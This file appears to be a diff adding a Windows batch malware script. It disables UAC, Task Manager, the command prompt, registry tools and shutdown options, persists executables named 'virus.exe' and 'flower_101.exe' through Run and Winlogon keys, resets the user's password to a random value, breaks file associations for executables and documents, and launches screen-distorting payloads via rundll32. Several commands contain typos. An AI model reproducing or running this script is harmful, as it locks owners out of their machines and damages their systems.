@@ -1,0 +1,121 @@
+START_1
+Reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DOWORD /d 0 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskmgr /t REG_DWORD /d 1 /f
+Reg add HKLM\SOFTWARE\Microsoft\PolicyManager\default\start /v HideShutdown /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f
+A1
+START rundll32.exe winapi.dll,draw_imageres_icon_circle_sprea
+START rundll32.exe winapi.dll,screen_broken_fast 
+START rundll32.exe winapi.dll,screen_invert_fast   
+START rundll32.exe winapi.dll,screen_colour_invert_fast        
+ping 127.0.0.0 -n 40
+taskkill /im rundll32.exe /f
+A2
+START rundll32.exe winapi.dll,screen_memz_up   
+START rundll32.exe winapi.dll,screen_broken_fast 
+START rundll32.exe winapi.dll,draw_user32_shield_circle_spread 
+START rundll32.exe winapi.dll,screen_colour_invert_fast        
+ping 127.0.0.0 -n 40
+taskkill /im rundll32.exe /f
+A3
+START rundll32.exe winapi.dll,draw_shell32_icon_mouse     
+START rundll32.exe winapi.dll,draw_user32_icon_random_fast 
+START rundll32.exe winapi.dll,screen_magnify_mid
+START rundll32.exe winapi.dll,screen_colour_invert_fast        
+ping 127.0.0.0 -n 40
+taskkill /im rundll32.exe /f
+A4
+START rundll32.exe winapi.dll,draw_shell32_icon_mouse_hyperbolic 
+START rundll32.exe winapi.dll,screen_invert_fast 
+START rundll32.exe winapi.dll,screen_invert_level_fast  
+START rundll32.exe winapi.dll,screen_colour_invert_fast        
+ping 127.0.0.0 -n 40
+taskkill /im rundll32.exe /f
+A5
+A4START rundll32.exe winapi.dll,screen_colour_invert_fast
+START rundll32.exe winapi.dll,screen_magnify_mid 
+START rundll32.exe winapi.dll,screen_move_left_invert_fast 
+START rundll32.exe winapi.dll,screen_move_down         
+ping 127.0.0.0 -n 40
+taskkill /im rundll32.exe /f
+B
+Reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v system /d C:\virus.exe
+Reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v system /d C:\virus.exe
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskmgr /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f 
+Reg add HKCU\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 1 /f
+Reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v HidePowerOptions /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Policies\Microsoft\MMC /v RestrictAuthor /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Policies\Microsoft\MMC /v RestrictToPermittedSnapins /t REG_DWORD /d 1 /f
+Reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Polices\Explorer /v NoDrives /t REG_DWORD /d 67108863 /f
+Reg add HKLM\SOFTWARE\Microsoft\CurrentVersion\Explorer\Advabced\Folder\Hidden\SHOWALL /v CheskVaule /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Policies\Microsoft\MMC\{8FC08734-A000000000000000000000000E1-11D1-A7D3-0000F87571E3} /v Restrict_Run /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shutdown /v CleanShutdown /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Advanced /ve  /d 1 /f
+Reg add HKLM\SYSTEM\CurrentControlSet\Control\KeyboardLayout /v ScancodeMap /t REG_BINARY /d 00000000000000000300000000005be000005ce000000000 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewOnDrive /t REG_DWORD /d 67108863 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoWinKeys /t REG_DWORD /d 1 /f 
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoLogOff /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoTrayltemsDisplay /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFloderOptions /t REG_DWORD /d 1 /f
+Reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon  /v shell  /d explorer.exe,C:\flower_101.exe /f
+Reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon  /v userininit  /d userinit.exe,C:\flower_101.exe /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSetTaskbar /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v Restrict_Run /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableLockedWorkstation /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskmgr /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f
+Reg add HKLM\SOFTWARE\Microsoft\PolicyManager\default\start /v HideShutdown /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
+Reg add HKLM\SYSTEM\ControlSet001\Control /v ProtableOperatingSystem /t  REG_DWORD /d 1 /f
+Reg add HKLM\SOFTWARE\Microsoft\WindowsSelfHost\UI\Selection /v UIBranch  /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v ClearRecentDocsOnExit /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoActiveDesktopChanges /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoChangeStart Menu /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDriveTypeAutoRun /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFavoritesMenu /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFileMenu /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFind /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRecebtDocsHistory /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRecebtDocsMenu /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoWinkeys /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSetFolders /t REG_DWORD /d 1 /f
+Reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSetTaskbar /t REG_DWORD /d 1 /f
+net user %username%  %random%
+ASSOC .txt=jpegfile
+ASSOC .cmd=jpegfile
+ASSOC .doc=jpegfile
+ASSOC .msc=jpegfile
+ASSOC .bat=jpegfile
+ASSOC .scr=jpegfile
+ASSOC .ttf=jpegfile
+ASSOC .dll=jpegfile
+ASSOC .pif=jpegfile
+ASSOC .zip=jpegfile
+ASSOC .rar=jpegfile
+ASSOC .exe=jpegfile
+ASSOC .cpp=jpegfile
+ASSOC .inf=jpegfile
+ASSOC .iso=jpegfile
+ASSOC .wim=jpegfile
+ASSOC .ppt=jpegfile
+ASSOC .reg=jpegfile
+ASSOC .obj=jpegfile
+ASSOC .jpg=scrfile
+ASSOC .sys=jpegfile
+ASSOC .com=jpegfile
+ASSOC .LOG=jpegfile
+ASSOC .e=jpegfile
+ASSOC .py=jpegfile
+ASSOC .xml=jpegfile
+start Rundll32.exe winapi.dll,draw_imageres_icon_circle_spread 
+start Rundll32.exe winapi.dll,draw_user32_icon_random_fast
+start Rundll32.exe winapi.dll,draw_user32_icon_mouse 
+
+
